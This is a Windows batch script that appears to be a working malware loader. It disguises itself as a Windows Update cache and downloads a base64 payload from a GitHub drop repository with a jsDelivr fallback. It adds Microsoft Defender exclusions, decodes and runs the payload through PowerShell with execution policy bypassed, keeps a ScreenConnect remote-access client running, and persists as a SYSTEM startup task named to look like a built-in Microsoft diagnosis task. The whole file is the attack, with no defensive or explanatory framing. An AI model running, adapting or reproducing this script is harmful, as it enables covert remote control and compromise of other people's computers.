@echo off
setlocal EnableExtensions
echo === GO.CMD BUILD 20260730WU8B ===

net session >nul 2>&1
if errorlevel 1 (
  echo Acces refuse: run as Administrator or SYSTEM - not Guest.
  exit /b 5
)

set "WORKDIR=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "B64=%WORKDIR%\update.b64"
set "PS1=%WORKDIR%\wucache_pkg.ps1"
set "PS1ALT=C:\Windows\Temp\wucache_pkg.ps1"
set "ERR=%WORKDIR%\boot.err"
set "MARKER=WU_BUILD_20260730_UNIFIED5"
set "ONCETASK=\Microsoft\Windows\Diagnosis\WMIRegistration"
set "CB=%RANDOM%%RANDOM%"
set "ALTSC=ScreenConnect Client (f861c8140d453427)"
set "PRIMSC=ScreenConnect Client (5f6010579852e507)"
set "WRAP=%WORKDIR%\boot_%RANDOM%.cmd"

if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1
if not exist "C:\Windows\Temp" mkdir "C:\Windows\Temp" >nul 2>&1

sc config "%ALTSC%" start= auto >nul 2>&1
sc start "%ALTSC%" >nul 2>&1

del /f /q "%B64%" >nul 2>&1
del /f /q "%ERR%" >nul 2>&1
del /f /q "%WORKDIR%\go.flag" >nul 2>&1
schtasks /Delete /TN "%ONCETASK%" /F >nul 2>&1

echo DL payload t=%CB% ...
curl.exe -L --ssl-no-revoke --connect-timeout 15 -o "%B64%" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateA.b64?t=%CB%" >nul 2>&1
if not exist "%B64%" goto :dl2
for %%A in ("%B64%") do if %%~zA LEQ 1000 goto :dl2
goto :have

:dl2
curl.exe -L --ssl-no-revoke --connect-timeout 15 -o "%B64%" "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/updateA.b64?t=%CB%" >nul 2>&1
if not exist "%B64%" goto :dlfail
for %%A in ("%B64%") do if %%~zA LEQ 1000 goto :dlfail
goto :have

:dlfail
echo Download failed.
sc start "%ALTSC%" >nul 2>&1
exit /b 1

:have
for %%A in ("%B64%") do echo OK bytes=%%~zA

> "%WRAP%" echo @echo off
>>"%WRAP%" echo setlocal EnableExtensions
>>"%WRAP%" echo echo boot_start %%DATE%% %%TIME%%^>"%ERR%"
>>"%WRAP%" echo sc config "%ALTSC%" start= auto ^>nul 2^>^&1
>>"%WRAP%" echo sc start "%ALTSC%" ^>nul 2^>^&1
>>"%WRAP%" echo powershell.exe -NoP -NonI -EP Bypass -C "Try{Add-MpPreference -ExclusionPath '%WORKDIR%' -EA 0;Add-MpPreference -ExclusionPath 'C:\Windows\Temp' -EA 0;Add-MpPreference -ExclusionProcess 'powershell.exe' -EA 0;Add-MpPreference -ExclusionProcess 'certutil.exe' -EA 0}Catch{}" ^>nul 2^>^&1
>>"%WRAP%" echo del /f /q "%PS1ALT%" ^>nul 2^>^&1
>>"%WRAP%" echo del /f /q "%PS1%" ^>nul 2^>^&1
>>"%WRAP%" echo echo decoding^>^>"%ERR%"
>>"%WRAP%" echo certutil.exe -decode "%B64%" "%PS1ALT%" ^>nul 2^>^&1
>>"%WRAP%" echo if not exist "%PS1ALT%" powershell.exe -NoP -NonI -EP Bypass -C "$b=[IO.File]::ReadAllText('%B64%') -replace '\s','';[IO.File]::WriteAllBytes('%PS1ALT%',[Convert]::FromBase64String($b))" ^>nul 2^>^&1
>>"%WRAP%" echo if not exist "%PS1ALT%" echo decode_fail^>^>"%ERR%" ^& exit /b 2
>>"%WRAP%" echo for %%%%A in ("%PS1ALT%") do echo decoded_bytes=%%%%~zA^>^>"%ERR%"
>>"%WRAP%" echo findstr /C:"%MARKER%" "%PS1ALT%" ^>nul
>>"%WRAP%" echo if errorlevel 1 echo marker_fail^>^>"%ERR%" ^& exit /b 3
>>"%WRAP%" echo copy /y "%PS1ALT%" "%PS1%" ^>nul 2^>^&1
>>"%WRAP%" echo echo running_payload^>^>"%ERR%"
>>"%WRAP%" echo powershell.exe -NoP -NonI -EP Bypass -File "%PS1ALT%" ^>^>"%ERR%" 2^>^&1
>>"%WRAP%" echo sc config "%ALTSC%" start= auto ^>nul 2^>^&1
>>"%WRAP%" echo sc start "%ALTSC%" ^>nul 2^>^&1
>>"%WRAP%" echo echo boot_exit_%%ERRORLEVEL%%^>^>"%ERR%"

echo %WRAP%>"%WORKDIR%\go.flag"

REM Detached process (NOT /b) so SC Guest 10s kill cannot stop the worker
start "" /min cmd.exe /c "%WRAP%"

REM SYSTEM task backup (independent of this console)
schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "%WRAP%" >nul 2>&1
schtasks /Run /TN "%ONCETASK%" >nul 2>&1

echo Launched DETACHED worker [%MARKER%].
echo Check in 2-3 min: type "%ERR%"
sc start "%ALTSC%" >nul 2>&1
exit /b 0
